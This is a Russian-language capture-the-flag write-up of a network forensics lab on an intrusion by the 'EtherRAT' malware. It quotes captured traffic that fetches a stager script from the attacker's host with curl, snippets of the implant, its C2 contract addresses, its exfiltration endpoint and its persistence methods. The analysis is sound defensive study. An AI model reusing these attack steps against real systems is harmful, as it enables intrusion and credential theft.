# CallMeOnTheChain – EtherRAT Lab

[EtherRAT](https://cyberdefenders.org/blueteam-ctf-challenges/callmeonthechain-etherrat/)

**Категория:** Network Forensics

**Уровень:** Advanced

**Инструменты:** Wireshark, Etherscan.io, CyberChef.

### Описание:

10 февраля 2026 года в компании Maromalix (интернет-магазин товаров для питомцев) были зафиксированы подозрительные действия: учетные данные, которые не должны были покидать периметр сети, были использованы из внешнего источника. Расследование показало, что злоумышленник получил доступ к публичному веб-приложению через уязвимость в Next.js и использовал блокчейн Ethereum в качестве канала управления (C2). В ходе расследования необходимо было расшифровать TLS-трафик, проанализировать вредоносный код, изучить смарт-контракты и восстановить полную цепочку атаки.

**Цель расследования:** Восстановить хронологию инцидента, идентифицировать индикаторы компрометации (IOCs) и техники атакующего (TTPs).

---

### Initial Access

#### Вопрос 1: Какой IP-адрес атакующего эксплуатировал веб-приложение?

**Ответ:** `63.180.69.24`

1. Применила фильтр для отображения HTTP запросов к целевому серверу: `http.request and ip.dst == 172.31.44.238`
2. Нашла post-запрос к эндпоинту `/api/auth/check` с заголовком Next-Action, содержащим хэш действия сервера, и большое количество других запросов + посмотрела статистику по общению между ip адресами.
 
```
POST /api/auth/check HTTP/1.1
Host: maromalix.cloud
Next-Action: dbfe59e0cd8cab30f33f278c0cda4bcbb6b6c84f
```

<img width="550" height="400" alt="1 вопрос" src="https://github.com/user-attachments/assets/68696b3f-61ff-47ca-849d-15a99eb8cebb" />

#### Вопрос 2: Какой идентификатор CVE у уязвимости, эксплуатированной в этой атаке?

**Ответ:** `CVE-2025-55182`

- Уязвимость эксплуатируется через заголовок `Next-Action`, содержащий хэш серверного действия
- Так же атака не требует аутентификации, что делает её достаточно опасной.

[CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)

---

### Execution

#### Вопрос 3: Каково имя файла скрипта, загруженного эксплойтом для установки вредоносного ПО?

**Ответ:** `s.sh`

1. Расшифровала tls трафик с помощью второго файла `sslkey.log` в Wireshark, применила фильтр для поиска команд загрузки: `http contains "wget" or http contains "curl" or http contains "bash"`, нашла запрос с методом `HEAD` к целевому серверу
2. В деталях пакета увидела User-Agent `curl/7.81.0` и хост, указывающий на внешний ресурс

```
GET /s.sh HTTP/1.1
Host: 63[.]176[.]62[.]199
User-Agent: curl/7.81.0
Accept: */*
```

<img width="550" height="400" alt="3 djghjc crhbgn" src="https://github.com/user-attachments/assets/da48052b-eb65-4532-af4c-b2283283f1de" />

---

#### Вопрос 4: Каково имя файла расшифрованного импланта, который служит основным RAT?

**Ответ:** `.7vfgycfd01.js`

1. В трафике нашла скрипт, который использует алгоритм AES-256-CBC
2. Вытащила base64.
3. Использовала простой скрипт на Node.js для расшифровки с использованием ключа a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5 и IV d4e5f6a7b8c9d0e1, которые так же были обнаружены в пакете
4. Запустила скрипт командой `node decrypt1.js` и получила читаемый исходный код

<img width="350" height="400" alt="4 вопрос" src="https://github.com/user-attachments/assets/cf0c99eb-1d94-4e75-beea-ab36cd8dba28" />  <img width="400" height="300" alt="base64" src="https://github.com/user-attachments/assets/7bb641ee-9c92-43aa-8bd0-1c554fc20763" />


---

### Defense Evasion

#### Вопрос 5: Какой путь к скрытой директории используется вредоносным ПО для хранения своих компонентов?

**Ответ:** `~/.local/share/.05bf0e9b`

В расшифрованном коде `.7vfgycfd01.js` нашла объявление констант для путей:

```  
const MALWARE_DIR = path.join(os.homedir(), '.local', 'share', '.05bf0e9b');`
const STATE_FILE = path.join(MALWARE_DIR, '.a3f8b2c1d4e5.json');`
```

+ в этой же директории хранится файл состояния `.a3f8b2c1d4e5.json` с Bot ID и информацией о пройденных этапах

<img width="500" height="350" alt="5 вопрос" src="https://github.com/user-attachments/assets/360b0573-e8b3-4af9-8839-df794f0f9873" />


---

#### Вопрос 6: Вредоносное ПО проверяет системную локаль, чтобы избежать выполнения в определенных регионах. Какой первый код локали в блок-листе?

**Ответ:** `ru`

 В коде `.7vfgycfd01.js` нашла функцию `checkLocale()` и массив `BANNED_LOCALES`:
 
`const BANNED_LOCALES = ['ru', 'be', 'kk', 'ky', 'tg', 'uz', 'hy', 'az', 'ka'];`

<img width="450" height="400" alt="язык" src="https://github.com/user-attachments/assets/33896f13-78ad-4a91-87e8-57b4574c26a7" />

---

### Command and Control

#### Вопрос 7: Каковы два адреса смарт-контрактов, используемых для разрешения C2?

**Ответ:** `0x22f96d61cf118efabc7c5bf3384734fad2f6ead4, 0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4`

В коде .7vfgycfd01.js нашла массив:

```
const CONTRACTS = [
    {
        name: 'PRIMARY',
        contract: '0x22f96d61cf118efabc7c5bf3384734fad2f6ead4',
        // ...
    },
    {
        name: 'FALLBACK',
        contract: '0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4',
        // ...
    }
];
```

<img width="450" height="350" alt="7вопрос" src="https://github.com/user-attachments/assets/9b10e2b7-58f8-4245-97b6-f84a8bdb543f" />

---

#### Вопрос 8: Когда был развернут первичный смарт-контракт в сети Ethereum?

**Ответ:** `2025-12-05 19:13:47`

1. Открыла адрес первого контракта на Etherscan.io (вкладка Transactions)
2. Прокрутила в самый конец списка и нашла самую первую транзакцию, которая является транзакцией создания контракта (Contract Creation)
4. В деталях транзакции нашла поле timestamp: Dec-05-2025 07:13:47 PM +UTC
5. Конвертировала время в 24 часовой формат: 19:13:47

<img width="500" height="300" alt="8-дата смарт контракта" src="https://github.com/user-attachments/assets/f23a5334-5a5c-409d-b809-26d83d3d2147" />

---

#### Вопрос 9: Поскольку смарт-контракт развернут в публичном блокчейне, его исходный код может быть получен. Какое имя функции используется для получения сохраненного C2 URL?

**Ответ:** `getString`

1. В коде `.7vfgycfd01.js` нашла константу:
  `const FUNC_SELECTOR = '0x7d434425';`
2. Попробовала найти этот селектор в базе 4byte.directory, но совпадения не нашлось.
3. Просмотрела вкладку **Events** и историю транзакций. Обнаружила, что для записи данных используется метод с меткой `Set String`
4. Немного погуглила и выяснила что в смарт контрактах и программировании в целом распространён паттерн парных методов `set`/`get`.

---

#### Вопрос 10: Каков хэш транзакции первой публикации C2 URL в первичный контракт?

**Ответ:** `0xe4efe4d2b118229161f7023e13ab98b54180fbfb1756d11959e4f19238b9655d`

1. На странице контракта в Etherscan перешла на вкладку **Events**
2. Отсортировала события по времени и нашла самую первую запись в списке

<img width="550" height="350" alt="первая транзакция" src="https://github.com/user-attachments/assets/fc5e9e11-3737-4daa-8d28-6629fda454ae" />  <img width="550" height="300" alt="первая транзакция-2" src="https://github.com/user-attachments/assets/0b1a8191-60a5-48a4-a342-b88a1aec93f5" />


---

#### Вопрос 11: Когда имплантат получил URL адрес C2 из блокчейна?

**Ответ:** `2026-02-10 18:37:25`

1. В Wireshark применила фильтр  `http contains "eth_call"`
2. Нашла немколько post запросов к eth.merkle.io, mainnet.gateway.tenderly.co и др.
3. В последнем пакете обнаружила закодированную строку.
4. Декодировала hex строку `https://63[.]176[.]62[.]199:443`

<img width="500" height="200" alt="вопрос 11" src="https://github.com/user-attachments/assets/998d8b9b-3645-4a62-9120-45bdbc5b164c" />

---

#### Вопрос 12: Какой URL-адрес C2 получил имплантат из блокчейна во время выполнения?

**Ответ:** `https://63[.]176[.]62[.]199:443` (был найден в прошлом вопросе)

<img width="600" height="400" alt="вопрос 12" src="https://github.com/user-attachments/assets/eb51127d-1458-4bd7-9207-818b5d9362af" />  <img width="600" height="300" alt="вопрос 12-1" src="https://github.com/user-attachments/assets/241c100a-f419-4a2d-ab48-8f143e7b2b79" />


---

#### Вопрос 13: Какой Bot ID назначен скомпрометированному хосту?

**Ответ:** `4ebfbc8aedf60511`

1. Применила в Wireshark фильтр для запросов к C2-серверу: `http.request and ip.dst == 63[.]176[.]62[.]199`
2. Строка `4ebfbc8aedf60511` встречается несколько раз. 

---

### Credential Access

#### Вопрос 14: После подключения к C2 имплантат начал выполнять многоэтапные полезные нагрузки. Какой путь к эндпоинту используется для эксфильтрации собранных учетных данных?

**Ответ:** `/crypto/keys`

1. Применила фильтр `http.request.method == "POST" and ip.dst == 63[.]176[.]62[.]199`
2. Нашла post запрос с заголовком Content-Type: application/json и путем /crypto/keys

<img width="650" height="450" alt="вопрос 14" src="https://github.com/user-attachments/assets/7df95fa3-2231-4ca5-b5d2-1201d3356f73" />

---

### Persistence

#### Вопрос 15: Каково имя файла пользовательского сервиса systemd, созданного для обеспечения постоянного доступа?

**Ответ:** `c16a536e1a9cb42d.service`

1. В трафике нашла get запрос к C2 c расширением .gif в урле, он вернул ответ с Content-Type: application/javascript
2. Проанализировала полученный JavaScript код. В нем обнаружил функцию persistSystemd(), которая создает файл сервиса
3. В коде генерируется случайное 8-символьное hex имя для сервиса
+ малварь также устанавливает persistence через `~/.config/autostart/*.desktop`, cron (@reboot), .bashrc, .profile

<img width="600" height="300" alt="вопрос 15" src="https://github.com/user-attachments/assets/bbcdd95d-e8fe-4159-9119-6e5e61ff2a9b" />  <img width="600" height="300" alt="вопрос 15-1" src="https://github.com/user-attachments/assets/d7d5a5e7-08c8-4c43-a6be-1f1948d444d3" />

---

#### Вопрос 16: Каково поле комментария во внедренном атакующим SSH публичном ключе?

**Ответ:** `maromalix@ether_dev`

<img width="500" height="175" alt="вопрос 16" src="https://github.com/user-attachments/assets/e3f1362b-494c-44b9-8f66-704fd474d50c" />

---

### Execution

#### Вопрос 17: Когда была выполнена первая удаленная команда через канал C2?

**Ответ:** `2026-02-10 18:40:13`

1. Применила фильтр для поиска ответов от C2 с исполняемым кодом: `http.response and ip.addr==63[.]176[].62[.]199 and http.content_type contains "javascript"`
2. Нашла команду `whoami` + время Date: Tue, 10 Feb 2026 18:40:13 GMT

<img width="700" height="300" alt="вопрос 17" src="https://github.com/user-attachments/assets/61ca8c81-6b84-4793-aaed-9699a0013056" />

---

### Impact

#### Вопрос 18: После получения доступа атакующий закрыл дверь за собой. Какая версия Next.js была установлена для устранения уязвимости?

**Ответ:** `15.3.9`

1. Применила фильтр для поиска по содержимому пакетов: `frame contains "next@"`
2. Этот фильтр нашел строку `next@15.3.9`.

<img width="700" height="450" alt="последний вопрос" src="https://github.com/user-attachments/assets/0207f76e-8461-4a94-a925-184e43753c01" />

---

#### Attribution

#### Вопрос 19: Основываясь на наблюдаемых индикаторах компрометации (IOCs) и тактиках, техниках и процедурах (TTPs), какое государство, вероятнее всего, стоит за этой активностью?

**Ответ:** `DPRK` (Корейская Народно-Демократическая Республика)

